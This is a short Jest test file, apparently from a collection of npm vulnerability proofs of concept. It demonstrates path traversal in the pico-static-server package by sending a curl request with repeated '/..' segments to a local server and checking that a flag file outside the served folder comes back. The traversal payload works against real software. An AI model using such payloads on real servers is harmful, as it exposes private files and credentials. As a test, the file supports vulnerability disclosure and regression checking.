//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/pico-static-server/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in pico-static-server", (done) => {
    const createServer = require('pico-static-server');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    const staticServer = createServer({
        defaultFile: 'index.html', // not required, defaults to 'index.html'
        staticPath: '.', // not required, defaults to './'
        port: 8982, // not required, defaults to 8080
    });
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8982${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
